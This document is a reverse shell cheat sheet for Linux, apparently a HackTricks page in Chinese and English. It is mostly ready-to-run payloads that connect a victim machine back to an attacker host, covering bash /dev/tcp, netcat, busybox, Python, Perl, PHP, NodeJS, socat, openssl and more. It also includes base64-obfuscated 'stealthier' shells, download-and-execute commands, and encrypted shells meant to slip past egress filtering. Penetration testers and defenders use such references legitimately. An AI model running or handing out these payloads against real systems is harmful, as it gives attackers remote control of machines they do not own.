# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**如果你对这些 shells 有任何疑问，可以通过** [**https://explainshell.com/**](https://explainshell.com) **来查看。**

## Full TTY

**一旦你获得一个 reverse shell**[ **请阅读此页面以获得一个 full TTY**](full-ttys.md)**。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
不要忘记检查其他 shells：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell 解释

1. **`bash -i`**: 这部分命令启动一个交互式（`-i`）Bash shell。
2. **`>&`**: 这部分命令是一个简写，用于将**标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一个目标**。
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 这是一个特殊文件，**表示到指定 IP 地址和端口的 TCP 连接**。
- 通过**将输出和错误流重定向到这个文件**，该命令实际上把交互式 shell 会话的输出发送到攻击者的机器。
4. **`0>&1`**: 这部分命令将**标准输入**（`stdin`）重定向到与标准输出（`stdout`）相同的目标。

### Create in file and execute
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

当处理 Linux-based web application 中的 **Remote Code Execution (RCE)** 漏洞时，获取 reverse shell 可能会被 network defenses（如 iptables rules 或复杂的 packet filtering mechanisms）阻碍。在这种受限环境中，一种替代方法是建立一个 PTY (Pseudo Terminal) shell，以便更有效地与已被攻陷的系统交互。

为此推荐的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它可以简化与目标环境的交互。

为了有效使用 toboggan，请创建一个针对目标系统的 RCE 场景定制的 Python module。例如，一个名为 `nix.py` 的 module 可以按如下方式构建：
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
然后，你可以运行：
```shell
toboggan -m nix.py -i
```
为了直接利用一个 interractive shell。你可以添加 `-b` 以进行 Burpsuite integration，并移除 `-i` 以获得一个更基础的 rce wrapper。

另一种可能是使用 `IppSec` 的 forward shell 实现 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。

你只需要修改：

- vulnerable host 的 URL
- 你的 payload 的前缀和后缀（如果有）
- payload 的发送方式（headers？data？额外信息？）

然后，你就可以直接**发送 commands**，甚至**使用 `upgrade` command** 来获得完整的 PTY（注意，pipes 的读写大约会有 1.3s 的延迟）。

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

在 **routers**、**embedded devices**、**containers** 和精简版 Linux appliances 中非常常见。如果没有单独的 `nc`，检查 BusyBox 是否提供它：
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
如果 `busybox nc` 存在但交互式执行不稳定，那么 `nc` 部分中的 FIFO 模式通常仍然可用：
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

查看 [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻击者**
```bash
while true; do nc -l <port>; done
```
要发送命令，请把它写下来，按回车，然后按 CTRL+D（停止 STDIN）

**Victim**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh（built-in TCP）
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – 用 Rust 编写的现代 netcat-like listener（自 2024 年起已打包进 Kali）。
```bash
# Attacker – interactive TLS listener with history & tab-completion
rcat listen -ib 55600

# Victim – download static binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Features:
- 可选的 `--ssl` 标志，用于加密传输（TLS 1.3）
- `-s` 用于在目标上 spawn 任意 binary（例如 `/bin/sh`、`python3`）
- `--up` 用于自动 upgrade 为 fully interactive PTY

## pwncat-cs

如果你已经有 **any raw reverse shell**，但想要一个 listener，自动尝试将其 upgrade 成更可用的 session，`pwncat-cs` 是一个很好的现代替代品，可替代普通的 `nc -lvnp` listener。
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
它还支持 **encrypted** `ssl-bind` 和 `ssl-connect` 通道，因此在需要传输加密时，你可以将它与 `ncat --ssl` 或 `socat OPENSSL:` payloads 配合使用。

## revsh (encrypted & pivot-ready)

`revsh` 是一个很小的 C client/server，它通过一个 **encrypted Diffie-Hellman tunnel** 提供完整的 TTY，并且可以选择附加一个 **TUN/TAP** interface，用于类似 reverse VPN 的 pivoting。
```bash
# Build (or grab a pre-compiled binary from the releases page)
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443 with a pinned certificate
revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem

# Victim – reverse shell over TLS to the attacker
./revsh <ATTACKER-IP>:443
```
Useful flags:
- `-b` : bind-shell instead of reverse
- `-p socks5://127.0.0.1:9050` : proxy through TOR/HTTP/SOCKS
- `-t` : create a TUN interface (reverse VPN)

因为整个会话是 encrypted 且 multiplexed，它通常可以绕过那些会杀死明文 `/dev/tcp` shell 的简单 egress filtering。

## OpenSSL

A **single-port encrypted reverse shell** 通常比经典的 two-listener pattern 更实用，因为它更容易通过 `443` 代理，也更容易自动化。

The Attacker (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
受害者
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
当你想要分离输入/输出通道时，仍然可以使用经典的 **two-listener** 模式：
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### 反向 shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**攻击者**
```bash
while true; do nc -l 79; done
```
写下命令，按回车，然后按 CTRL+D（停止 STDIN）

**Victim**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

这将尝试连接到你系统上的 6001 端口：
```bash
xterm -display 10.0.0.1:1
```
要捕获 reverse shell，你可以使用（它会监听端口 6001）：
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

由 [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 提供 注：Java reverse shell 也适用于 Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)

{{#include ../../banners/hacktricks-training.md}}
